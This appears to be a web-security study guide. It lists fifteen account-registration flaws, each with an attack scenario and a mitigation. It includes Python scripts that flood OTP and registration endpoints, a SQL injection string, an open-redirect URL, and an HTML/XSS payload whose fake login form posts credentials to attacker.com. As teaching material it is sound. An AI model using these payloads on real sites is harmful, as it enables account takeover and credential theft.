# Account Registration Vulnerabilities

## 1. Http not Https  
**Vulnerability**: If the website uses HTTP instead of HTTPS, all data (like email, password, OTP) is sent in plaintext and can be intercepted.  
**Attack Scenario**: If you're on public WiFi and register on a website that uses HTTP, an attacker using tools like Wireshark can sniff your email and password easily.  
**Impact**: Credential theft.  
**Mitigation**: Enforce HTTPS and implement HSTS.

---

## 2. No confirmation code leads to account creation with admin email  
**Vulnerability**: If the website doesn't validate the email, you can register with someone else's email or even the admin's.  
**Attack Scenario**:  
◇ Sign up using `admin@example.com`  
◇ If there’s no confirmation, you now control the account associated with the admin’s email.  
**Impact**: Privilege escalation.  
**Mitigation**: Enforce email confirmation before allowing login or sensitive actions.

---

## 3. Reusable confirmation link  
**Vulnerability**: The confirmation link is reusable.  
**Attack Scenario**:  
◇ You receive an account confirmation email.  
◇ You confirm the account, but keep the link.  
◇ If reused, it grants access or creates a new session.  
**Impact**: Unauthorized access.  
**Mitigation**: Make confirmation links single-use and expire them after first use.

---

## 4. OTP abuse without rate-limiting  
**Vulnerability**: No rate limit on OTP requests allows abuse.  
**Attack Scenario**:  
◇ Attacker sends thousands of OTP requests to a victim.  
◇ Or brute-forces the OTP using Burp Intruder or Python script:

```python
import requests
for i in range(50):
    requests.post("http://example.com/send_otp", data={"email": "test@mail.com"})
```

**Impact**: DoS or unauthorized access.  
**Mitigation**: Apply rate limiting and CAPTCHA.

---

## 5. OTP leaked in response  
**Vulnerability**: OTP is included in the server response.  
**Attack Scenario**:  
◇ Intercept the request using Burp Suite.  
◇ Response contains `{ "otp": "123456" }`.  
**Impact**: Easy OTP theft.  
**Mitigation**: Never expose OTPs in responses; send them via secure channels.

---

## 6. Pre-account Takeover with 2FA  
**Vulnerability**: Attacker enables 2FA before verifying email.  
**Attack Scenario**:  
◇ Sign up with `victim@example.com`  
◇ Enable 2FA without verifying the email  
◇ Victim can’t access their account later.  
**Impact**: Account lockout.  
**Mitigation**: Block all settings access until email is verified.

---

## 7. Pre-account Takeover via social login  
**Vulnerability**: Attacker links social login to an unverified email.  
**Attack Scenario**:  
◇ Sign up with `victim@example.com`  
◇ Link Google account  
◇ Victim later tries to log in via Google and loses control.  
**Impact**: Unauthorized account linking.  
**Mitigation**: Restrict OAuth linking until email is verified.

---

## 8. OAuth Auto-verification exploit  
**Vulnerability**: Signing in via OAuth verifies an unverified account.  
**Attack Scenario**:  
◇ Attacker signs up with `victim@gmail.com` but doesn't verify.  
◇ Victim later uses Google OAuth.  
◇ Old attacker account becomes verified.  
**Impact**: Account takeover.  
**Mitigation**: Treat OAuth logins as separate flows; avoid merging with unverified accounts.

---

## 9. Email change bypasses verification  
**Vulnerability**: Change email before verifying original email.  
**Attack Scenario**:  
◇ Sign up with `victim@gmail.com`, don’t verify  
◇ Go to settings and change the email to `hacker@gmail.com` and verify  
◇ Entire account is now owned by attacker  
**Impact**: Email hijack  
**Mitigation**: Restrict email change until original email is verified.

---

## 10. Account deletion without password confirmation  
**Vulnerability**: Delete account without password confirmation.  
**Attack Scenario**:  
◇ After hijacking, attacker deletes account easily.  
**Impact**: Permanent denial of access.  
**Mitigation**: Require re-authentication for critical actions.

---

## 11. HTML Injection in username field  
**Vulnerability**: HTML injection leads to UI deception.  
**Attack Scenario**:
```html
<b style="color:red">Admin</b>
<img src=x onerror="alert('XSS')">
<form action="https://attacker.com" method="POST">
  <input name="username">
  <input name="password" type="password">
  <button type="submit">Login</button>
</form>
```
**Impact**: Phishing, fake UI, or visual manipulation.  
**Mitigation**: Sanitize user input and use output encoding.

---

## 12. SQL Injection in username or email  
**Vulnerability**: SQL injection through input fields.  
**Attack Scenario**:  
◇ Try input like `' OR 1=1 --`  
**Impact**: Bypass login, data access.  
**Mitigation**: Use prepared statements and ORM.

---

## 13. Open Redirect after registration  
**Vulnerability**: Unvalidated redirect URL parameter.  
**Attack Scenario**:  
◇ `http://example.com/redirect?url=http://attacker.com`  
**Impact**: Phishing or malware redirection.  
**Mitigation**: Whitelist redirect destinations.

---

## 14. Missing rate-limiting for registration  
**Vulnerability**: Allows mass account creation.  
**Attack Scenario**:

```python
import requests, random, string

def generate_username(): return ''.join(random.choices(string.ascii_lowercase, k=8))
def generate_email(): return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@example.com"

url = "http://example.com/register"
data = { "password": "password123" }

for i in range(100):
    data["username"] = generate_username()
    data["email"] = generate_email()
    res = requests.post(url, data=data)
    print(f"Attempt {i+1}: {res.status_code}")
```

**Impact**: Spam, abuse, account farm.  
**Mitigation**: Apply CAPTCHA, email verification, and IP rate limiting.

---

## 15. Email enumeration on sign up  
**Vulnerability**: Site reveals if email exists during registration.  
**Attack Scenario**:  
◇ Try to register with `victim@example.com`  
◇ Server replies: "Email already in use"  
**Impact**: Leak of user existence.  
**Mitigation**: Generic error messages like "Registration failed."

